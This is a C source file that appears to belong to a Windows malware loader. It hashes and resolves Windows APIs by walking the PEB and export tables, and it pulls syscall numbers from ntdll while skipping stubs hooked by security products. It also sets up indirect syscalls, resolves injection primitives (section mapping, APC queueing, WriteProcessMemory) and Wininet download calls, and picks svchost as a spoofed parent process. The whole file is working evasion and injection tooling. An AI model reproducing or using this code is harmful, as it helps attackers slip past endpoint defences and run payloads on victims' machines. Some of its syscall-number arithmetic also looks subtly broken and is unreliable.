
#include "common.h"
#include "typedef.h"
#include "Resolve.h"

// -----------------------[  HASH HELPERS  ]-----------------------

extern "C" ULONG RTIME_FnvHashW(LPCWSTR str) {
	return HashStringFowlerNollVoVariant1aW(str);
}
extern "C" ULONG RTIME_FnvHashA(LPCSTR str) {
	return HashStringFowlerNollVoVariant1aA(str);
}

// -----------------------[ WINAPI HELPERS ]-----------------------

BOOL GetModuleHandleCustom(
	IN	PWINAPI_MODULE	pWinApiMod
) {
	if (!pWinApiMod || pWinApiMod->ModuleHash == 0)
		return FALSE;

#ifdef _WIN64
	PPEB	pPeb = (PPEB)(__readgsqword(0x60));
#elif _WIN32
	PPEB	pPeb = (PPEB)(__readfsdword(0x30));
#endif // _WIN64

	PPEB_LDR_DATA	pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
	PLIST_ENTRY		pDteHead = &(pLdr->InMemoryOrderModuleList);
	PLIST_ENTRY		pDteCurrent = pDteHead->Flink;

	do {
		PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pDteCurrent - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList));

		if (pDte->BaseDllName.Length != 0) {
			if (RTIME_FnvHashW(pDte->BaseDllName.Buffer) == pWinApiMod->ModuleHash) {
				pWinApiMod->ModuleHandle = (HMODULE)pDte->DllBase;
				return TRUE;
			}
		}

		pDteCurrent = pDteCurrent->Flink;
	} while (pDteCurrent != pDteHead);

	return FALSE;
}

FARPROC GetProcAddressCustom(
	IN OUT	PWINAPI_MODULE	pWinApiMod,
	IN		ULONG			uApiHash
) {
	PBYTE	pBase = (PBYTE)(pWinApiMod->ModuleHandle);

	if (pBase == NULL) {
		return NULL;
	}

	if (pWinApiMod->NumberOfFunctions == 0) {
		PIMAGE_DOS_HEADER	pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;

		if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
			return NULL;

		PIMAGE_NT_HEADERS	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);

		if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
			return NULL;

		IMAGE_OPTIONAL_HEADER	ImgOptHdr = pImgNtHdrs->OptionalHeader;
		PIMAGE_EXPORT_DIRECTORY	pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

		pWinApiMod->NumberOfFunctions = pImgExpDir->NumberOfFunctions;
		pWinApiMod->FunctionNameArray = (PDWORD)(pBase + pImgExpDir->AddressOfNames);
		pWinApiMod->FunctionAddressArray = (PDWORD)(pBase + pImgExpDir->AddressOfFunctions);
		pWinApiMod->FunctionOrdinalArray = (PWORD)(pBase + pImgExpDir->AddressOfNameOrdinals);
	}

	for (DWORD i = 0; i < pWinApiMod->NumberOfFunctions; i++) {
		CHAR* pFunctionName = (CHAR*)(pBase + pWinApiMod->FunctionNameArray[i]);

		if (RTIME_HFOWLERA(pFunctionName) == uApiHash) {
			PVOID pFunctionAddr = (PVOID)(pBase + pWinApiMod->FunctionAddressArray[pWinApiMod->FunctionOrdinalArray[i]]);
			return (FARPROC)pFunctionAddr;
		}
	}

	return NULL;

}

BOOL ResolveApis(
	OUT	PH_API* ppHashedApis
) {
	DEBUG_PRINT("g_InitHash: %d", g_InitHash);

	PWINAPI_MODULE	pKernel32 = (PWINAPI_MODULE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WINAPI_MODULE));
	PWINAPI_MODULE	pKernelbase = (PWINAPI_MODULE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WINAPI_MODULE));
	PWINAPI_MODULE	pWininet = (PWINAPI_MODULE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WINAPI_MODULE));
	PH_API			pHashedApis = (PH_API)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(H_API));

	if (!pKernel32 || !pKernelbase || !pWininet || !pHashedApis) {
		DEBUG_PRINT("Failed to allocate memory in InitApis.");
		return FALSE;
	}

	pKernel32->ModuleHash = KERNEL32_DLL_FnvvW;
	GetModuleHandleCustom(pKernel32);				// populates pKernel32->ModuleHandle

	if (!pKernel32->ModuleHandle) {
		DEBUG_PRINT("Failed to retrive kernel32.dll handle.");
		return FALSE;
	}

	pKernelbase->ModuleHash = KERNELBASE_DLL_FnnvW;
	GetModuleHandleCustom(pKernelbase);				// populates pKernelbase->ModuleHandle

	if (!pKernelbase->ModuleHandle) {
		DEBUG_PRINT("Failed to retrive kernelbase.dll handle");
		return FALSE;
	}

	pWininet->ModuleHandle = LoadLibraryW(L"Wininet.dll");

	pHashedApis->pCreateProcessW = (fnCreateProcessW)GetProcAddressCustom(pKernel32, CreateProcessW_FnvvW);
	if (!pHashedApis->pCreateProcessW) {
		DEBUG_PRINT("Failed to resolve CreateProcessW.");
		return FALSE;
	}
	DEBUG_PRINT("\"CreateProcessW\" address: 0x%p", pHashedApis->pCreateProcessW);

	pHashedApis->pWriteProcessMemory = (fnWriteProcessMemory)GetProcAddressCustom(pKernel32, WriteProcessMemory_FnvvW);
	if (!pHashedApis->pWriteProcessMemory) {
		DEBUG_PRINT("Failed to resolve WriteProcessMemory.");
		return FALSE;
	}
	DEBUG_PRINT("\"WriteProcessMemory\" address: 0x%p", pHashedApis->pWriteProcessMemory);

	pHashedApis->pDebugActiveProcessStop = (fnDebugActiveProcessStop)GetProcAddressCustom(pKernel32, DebugActiveProcessStop_FnvvW);
	if (!pHashedApis->pDebugActiveProcessStop) {
		DEBUG_PRINT("Failed to resolve DebugActiveProcessStop.");
		return FALSE;
	}
	DEBUG_PRINT("\"DebugActiveProcessStop\" address: 0x%p", pHashedApis->pDebugActiveProcessStop);

	pHashedApis->pInternetOpenW = (fnInternetOpenW)GetProcAddressCustom(pWininet, InternetOpenW_FnvvW);
	if (!pHashedApis->pInternetOpenW) {
		DEBUG_PRINT("Failed to resolve InternetOpenW.");
		return FALSE;
	}
	DEBUG_PRINT("\"InternetOpenW\" address: 0x%p", pHashedApis->pInternetOpenW);

	pHashedApis->pInternetOpenUrlW = (fnInternetOpenUrlW)GetProcAddressCustom(pWininet, InternetOpenUrlW_FnvvW);
	if (!pHashedApis->pInternetOpenUrlW) {
		DEBUG_PRINT("Failed to resolve InternetOpenUrlW.");
		return FALSE;
	}
	DEBUG_PRINT("\"InternetOpenUrlW\" address: 0x%p", pHashedApis->pInternetOpenUrlW);

	pHashedApis->pInternetSetOptionW = (fnInternetSetOptionW)GetProcAddressCustom(pWininet, InternetSetOptionW_FnvvW);
	if (!pHashedApis->pInternetSetOptionW) {
		DEBUG_PRINT("Failed to resolve InternetSetOptionW.");
		return FALSE;
	}
	DEBUG_PRINT("\"InternetSetOptionW\" address: 0x%p", pHashedApis->pInternetSetOptionW);

	pHashedApis->pInternetReadFile = (fnInternetReadFile)GetProcAddressCustom(pWininet, InternetReadFile_FnvvW);
	if (!pHashedApis->pInternetReadFile) {
		DEBUG_PRINT("Failed to resolve InternetReadFile.");
		return FALSE;
	}
	DEBUG_PRINT("\"InternetReadFile\" address: 0x%p", pHashedApis->pInternetReadFile);

	pHashedApis->pInternetCloseHandle = (fnInternetCloseHandle)GetProcAddressCustom(pWininet, InternetCloseHandle_FnvvW);
	if (!pHashedApis->pInternetCloseHandle) {
		DEBUG_PRINT("Failed to resolve InternetCloseHandle.");
		return FALSE;
	}
	DEBUG_PRINT("\"InternetCloseHandle\" address: 0x%p", pHashedApis->pInternetCloseHandle);

	pHashedApis->pInitializeProcThreadAttributeList = (fnInitializeProcThreadAttributeList)GetProcAddressCustom(pKernelbase, InitializeProcThreadAttributeList_FnvvW);
	if (!pHashedApis->pInitializeProcThreadAttributeList) {
		DEBUG_PRINT("Failed to resolve InitializeProcThreadAttributeList.");
		return FALSE;
	}
	DEBUG_PRINT("\"InitializeProcThreadAttributeList\" address: 0x%p", pHashedApis->pInitializeProcThreadAttributeList);

	pHashedApis->pUpdateProcThreadAttribute = (fnUpdateProcThreadAttribute)GetProcAddressCustom(pKernelbase, UpdateProcThreadAttribute_FnvvW);
	if (!pHashedApis->pUpdateProcThreadAttribute) {
		DEBUG_PRINT("Failed to resolve UpdateProcThreadAttribute.");
		return FALSE;
	}
	DEBUG_PRINT("\"InitializeProcThreadAttributeList\" address: 0x%p", pHashedApis->pUpdateProcThreadAttribute);


	*ppHashedApis = pHashedApis;

	return TRUE;
}

// -----------------------[ SYSCALL HELPERS ]-----------------------

BOOL GetSyscallAddress(
	IN  PWINAPI_MODULE  pNtdll,
	IN  ULONG           uSysHash,
	OUT PNT_SYSCALL     pNtSys
) {
	PBYTE pNtBase = (BYTE*)pNtdll->ModuleHandle;

	if (uSysHash != NULL)
		pNtSys->uSyscallHash = uSysHash;
	else
		return FALSE;

	// searching for 'uSysHash' in the exported functions of ntdll
	size_t i = 0;
	for (i; i < pNtdll->NumberOfFunctions; i++) {

		PCHAR pcFuncName = (PCHAR)(pNtBase + pNtdll->FunctionNameArray[i]);
		PVOID pFuncAddress = (PVOID)(pNtBase + pNtdll->FunctionAddressArray[pNtdll->FunctionOrdinalArray[i]]);

		// if syscall found
		if (RTIME_HFOWLERA(pcFuncName) == uSysHash) {

			if (*((PBYTE)pFuncAddress) == 0x4C
				&& *((PBYTE)pFuncAddress + 1) == 0x8B
				&& *((PBYTE)pFuncAddress + 2) == 0xD1
				&& *((PBYTE)pFuncAddress + 3) == 0xB8
				&& *((PBYTE)pFuncAddress + 6) == 0x00
				&& *((PBYTE)pFuncAddress + 7) == 0x00) {

				BYTE high = *((PBYTE)pFuncAddress + 5);
				BYTE low = *((PBYTE)pFuncAddress + 4);
				pNtSys->dwSSn = (high << 8) | low;
				break; // break for-loop [i]
			}

			// if hooked - scenario 1
			if (*((PBYTE)pFuncAddress) == 0xE9) {

				for (WORD idx = 1; idx <= RANGE; idx++) {
					// check neighboring syscall down
					if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
						&& *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
						&& *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
						&& *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
						&& *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

						BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
						BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
						pNtSys->dwSSn = (high << 8) | low - idx;
						break; // break for-loop [idx]
					}
					// check neighboring syscall up
					if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
						&& *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
						&& *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
						&& *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
						&& *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

						BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
						BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
						pNtSys->dwSSn = (high << 8) | low + idx;
						break; // break for-loop [idx]
					}
				}
			}

			// if hooked - scenario 2
			if (*((PBYTE)pFuncAddress + 3) == 0xE9) {

				for (WORD idx = 1; idx <= RANGE; idx++) {
					// check neighboring syscall down
					if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
						&& *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
						&& *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
						&& *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
						&& *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
						&& *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

						BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
						BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
						pNtSys->dwSSn = (high << 8) | low - idx;
						break; // break for-loop [idx]
					}
					// check neighboring syscall up
					if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
						&& *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
						&& *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
						&& *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
						&& *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
						&& *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

						BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
						BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
						pNtSys->dwSSn = (high << 8) | low + idx;
						break; // break for-loop [idx]
					}
				}
			}

			break; // break for-loop [i]
		}

	}


	ULONG_PTR uFuncAddress = (ULONG_PTR)(pNtBase + pNtdll->FunctionAddressArray[pNtdll->FunctionOrdinalArray[i]]);

	for (DWORD z = 0; z <= RANGE; z++) {
		if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)uFuncAddress + z + 1) == 0x05) {
			pNtSys->pSyscallInstAddress = (PVOID)((ULONG_PTR)uFuncAddress + z);
			break;  // break for-loop [x]
		}
	}


	// checking if all NT_SYSCALL's (pNtSys) element are initialized
	if (pNtSys->dwSSn != NULL && pNtSys->pSyscallInstAddress != NULL && pNtSys->uSyscallHash != NULL)
		return TRUE;
	else
		return FALSE;
}


BOOL ResolveSyscalls(
	OUT PSYSCALL_TABLE* ppSyscallTable
) {

	PWINAPI_MODULE	pNtdll = (PWINAPI_MODULE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WINAPI_MODULE));

	if (!pNtdll) {
		DEBUG_PRINT("Failed to allocate memory for NTDLL module.");
		return FALSE;
	}

	pNtdll->ModuleHash = NTDLL_FnvvW;
	GetModuleHandleCustom(pNtdll);				// populates pNtdll->ModuleHandle

	GetProcAddressCustom(pNtdll, NULL);			// pouplates count and array addresses for Ntdll

	if (!pNtdll->ModuleHandle || !pNtdll->NumberOfFunctions || !pNtdll->FunctionNameArray || !pNtdll->FunctionAddressArray || !pNtdll->FunctionOrdinalArray) {
		DEBUG_PRINT("Failed to fetch information for NTDLL.DLL");
		return FALSE;
	}

	PSYSCALL_TABLE pSysTable = (PSYSCALL_TABLE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SYSCALL_TABLE));

	if (!pSysTable) {
		DEBUG_PRINT("Failed to allocate memory for syscall table.");
		return FALSE;
	}

	if (!GetSyscallAddress(pNtdll, NtCreateSection_FnvvA, &pSysTable->NtCreateSection)) {
		DEBUG_PRINT("Failed to resolve NtCreateSection.");
		return FALSE;
	}
	DEBUG_PRINT("\"NtCreateSection\" syscall number: %d\t`syscall` instruction address: 0x%p", pSysTable->NtCreateSection.dwSSn, pSysTable->NtCreateSection.pSyscallInstAddress);

	if (!GetSyscallAddress(pNtdll, NtMapViewOfSection_FnvvA, &pSysTable->NtMapViewOfSection)) {
		DEBUG_PRINT("Failed to resolve NtMapViewOfSection.");
		return FALSE;
	}
	DEBUG_PRINT("\"NtMapViewOfSection\" syscall number: %d\t`syscall` instruction address: 0x%p", pSysTable->NtMapViewOfSection.dwSSn, pSysTable->NtMapViewOfSection.pSyscallInstAddress);

	if (!GetSyscallAddress(pNtdll, NtClose_FnvvA, &pSysTable->NtClose)) {
		DEBUG_PRINT("Failed to resolve NtClose.\n");
		return FALSE;
	}
	DEBUG_PRINT("\"NtClose\" syscall number: %d\t`syscall` instruction address: 0x%p", pSysTable->NtClose.dwSSn, pSysTable->NtClose.pSyscallInstAddress);

	if (!GetSyscallAddress(pNtdll, NtQueueApcThread_FnvvA, &pSysTable->NtQueueApcThread)) {
		DEBUG_PRINT("Failed to resolve NtQueueApcThread.");
		return FALSE;
	}
	DEBUG_PRINT("\"NtQueueApcThread\" syscall number: %d\t`syscall` instruction address: 0x%p", pSysTable->NtQueueApcThread.dwSSn, pSysTable->NtQueueApcThread.pSyscallInstAddress);

	if (!GetSyscallAddress(pNtdll, NtQuerySystemInformation_FnvvA, &pSysTable->NtQuerySystemInformation)) {
		DEBUG_PRINT("Failed to resolve NtQuerySystemInformation.");
		return FALSE;
	}
	DEBUG_PRINT("\"NtQuerySystemInformation\" syscall number: %d\t`syscall` instruction address: 0x%p", pSysTable->NtQuerySystemInformation.dwSSn, pSysTable->NtQuerySystemInformation.pSyscallInstAddress);

	if (!GetSyscallAddress(pNtdll, NtOpenProcess_FnvvA, &pSysTable->NtOpenProcess)) {
		DEBUG_PRINT("Failed to resolve NtOpenProcess.");
		return FALSE;
	}
	DEBUG_PRINT("\"NtOpenProcess\" syscall number: %d\t`syscall` instruction address: 0x%p", pSysTable->NtOpenProcess.dwSSn, pSysTable->NtOpenProcess.pSyscallInstAddress);

	*ppSyscallTable = pSysTable;

	return TRUE;
}

BOOL ResolveParentProcess(
	IN	PSYSCALL_TABLE	pSyscallTable,
	OUT	PHANDLE			phParent
) {
	HANDLE	hParentProcess = NULL;

	if (GetPsuedoParentProcess(pSyscallTable, svchost_FnvvW, &hParentProcess)) {
		*phParent = hParentProcess;

		return TRUE;
	}

	return FALSE;
}

BOOL Initialize(
	OUT PSYSCALL_TABLE* ppSyscallTable,
	OUT	PH_API* ppHashedApis,
	OUT	PHANDLE			phParent
) {
	// Resolve System call numbers and `syscall` instruction addresses
	if (!ResolveSyscalls(ppSyscallTable)) {
		return FALSE;
	}

	// Resolve Hashed WinAPI functions
	if (!ResolveApis(ppHashedApis)) {
		return FALSE;
	}

	// Resolve the handle to parent process (here svchost.exe, change at Resolve.h)
	if (!ResolveParentProcess(*ppSyscallTable, phParent)) {
		return FALSE;
	}

	return TRUE;
}